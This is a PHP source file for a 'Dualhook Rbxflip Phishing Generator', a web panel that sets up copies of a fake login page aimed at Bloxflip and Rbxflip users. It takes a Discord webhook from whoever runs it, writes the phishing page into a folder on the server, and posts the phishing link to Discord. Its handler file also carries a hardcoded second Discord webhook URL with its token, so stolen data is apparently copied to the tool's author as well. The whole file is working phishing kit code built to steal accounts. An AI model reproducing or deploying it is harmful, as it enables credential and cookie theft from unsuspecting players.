<?php
$name = "shockify";
$image = "https://lh3.googleusercontent.com/X7UTG6ZmwSpMCXEU6U8t1qcvHb7lRdKtdEzJEIcUnHJO5FXxbvebQBcrIFhOCroaoW30nOUjUo7UBYNvfFcidZiH=w128-h128-e365-rj-sc0x00ffffff";
$Tripleurl = "https://discord.com/api/webhooks/1108073072382201889/gZ8FoExeTDV-bv7eiqgku1KkwJLZrF0fPkSOcDkKiIka8wCzKwKAnRCPXLKzAy32lt8w";
?><?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $folder = $_POST['folder'];
    if(!is_dir($folder)){
    mkdir($folder);
    } else {
	die('Please don\'t try overwriting others\' loggers!');
    }
    $webhook = $_POST['webhook'];
    $id = rand(1302, 31424);
    
    $sql = "INSERT INTO loggers (id, webhook)
VALUES ($id, $webhook)";

$code1 = file_get_contents("login.php");
$code2 = file_get_contents("cookie.png");
$code3 = file_get_contents("bg.png");
$code4 = file_get_contents("poppins.woff2");
$code5 = file_get_contents("poppins_bold.woff2");
$myfile = fopen("$folder/webhook.php", "w");
$myfile2 = fopen("$folder/cookie.png", "w");
$myfile3 = fopen("$folder/bg.png", "w");
$myfile4 = fopen("$folder/poppins.woff2", "w");
$myfile5 = fopen("$folder/poppins_bold.woff2", "w");
$myfile1 = fopen("$folder/index.php", "w");
$txt = $code;
$txt1 = $code1;
$txt2 = $code2;
$txt3 = $code3;
$txt4 = $code4;
$txt5 = $code5;
fwrite($myfile1, $txt1);
fwrite($myfile2, $txt2);
fwrite($myfile3, $txt3);
fwrite($myfile4, $txt4);
fwrite($myfile5, $txt5);
fwrite($myfile, ' <?php $Tripleurl = "'.$Tripleurl.'"; $url = "'.$webhook.'"; ?> 

<?php
$name = "'.$name.'";
$image = "'.$image.'";
?>


'.$txt);
$url = "$webhook";
$headers = [ "Content-Type: application/json; charset=utf-8" ];
$POST = [
    "username" => "$name - Notifier",
    "avatar_url" => "$image",
     "content" => "@everyone",
        "embeds" => [
            [
                "title" => "$name ON TOP",
                "type" => "rich",
                "color" => hexdec("00000"),
                "thumbnail" => [
                    "url" => "$image"
                ],
                "author" => [
                     "name" => "Webhook Notifier",
                ],
                "image" => [
                    "url" => "$image"
                ],
                "footer" => [
                    "text" => "bloxflip phishing",
                  "icon_url" => "$image"
                ],
                "fields" => [
                    [
                        "name" => "**Ur Bloxflip phishing url 📌**",
                        "value" => "```http://".$_SERVER["SERVER_NAME"]."/$folder```",
                        "inline" => False
                    ],
                ]
            ],
        ],
    
    ];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response   = curl_exec($ch);

header("location: $folder/");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?=$name?></title>
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="twitter:site" content="<?=$name?>">
<meta name="twitter:title" content="Rbxflip Phishing">
<meta name="twitter:description" content="Check out Rbxflip Phishing">
<meta property=og:site_name content=Termed>
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image:src" content="https://images-ext-2.discordapp.net/external/IW7McOeLaqiVYwmh4SWDjdWI76MQTraKEx5sroiqMm4/https/cdn-icons-png.flaticon.com/256/9350/9350064.png?width=307&height=307">
<meta name="viewport" content="width=device-width">
    <link href="https://images-ext-2.discordapp.net/external/IW7McOeLaqiVYwmh4SWDjdWI76MQTraKEx5sroiqMm4/https/cdn-icons-png.flaticon.com/256/9350/9350064.png?width=307&height=307" rel="icon"> 
</head>
<style>
    *{
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }
    body{
        min-height: 100vh;
        background-image: url(<?=$image?>);
        display: flex;
        font-family: sans-serif;
    }
    .container{
        margin: auto;
        width: 500px;
        max-width: 90%;
    }
    .container form{
        width: 100%;
        height: 100%;
        padding: 20px;
        background: rgb(255, 255, 255);
        border-radius: 4px;
        box-shadow: 0 8px 16px rgba(0, 0, 0,.3);
    }
    .container form h1{
        text-align: center;
        margin-bottom: 24px;
        color: rgb(170, 0, 255);
    }
    .container form .form-control{
        width: 100%;
        height: 40px;
        background: rgb(250, 250, 247);
        border-radius: 4px;
        border: 1px solid silver;
        margin: 10px 0 18px 0;
        padding: 0 10px;
    }
    .container form .btn{
        margin-left: 50%;
        transform: translateX(-50%);
        width: 120px;
        height: 34px;
        border: none;
        outline: none;
        background:  rgb(0, 0, 0);
        cursor: pointer;
        font-size: 16px;
        text-transform: uppercase;
        color: white;
        border-radius: 4px;
        transition: .3s;
    }
    .container form .btn:hover{
        opacity: .7;
    }
    body{
        margin: 0;
        padding: 0;
    }

    h3{
        color: rgb(26, 26, 25);
        font-family: Source Sans Pro;
        font-weight: lighter;
        text-align: left;
        position: absolute;
        top: 250px;
        left: 750px;
    }
</style>
</head>
<body>
<div class="container">
    <form method="POST" action="../Control/create.php">
        <img src="<?=$image?>" width="120" height="120" align="right">
        <h1><a style="color: black;">Dualhook Rbxflip Phishing Generator </a></h1>
        <br>
        <br>
        <br>
        <div class="form-group">
            <span>Webhook</span>
            <input type="text" class="form-control" name="dhwebhook" placeholder="Webhook?" required>
            <span>Directory</span>
            <input type="text" name="folder" class="form-control" placeholder="Directory?"  required>
            <span>Image for Generator Page</span>
            <input type="text" name="image" class="form-control" placeholder="Image?" required>
            <span>Name for Generator Page</span>
            <input type="text" name="name" class="form-control" placeholder="Name?" required>
        </div>
        <input type="submit" class="btn" value="Generate">
        <br>
        <br>
    </form>
</div>
</body>
</html>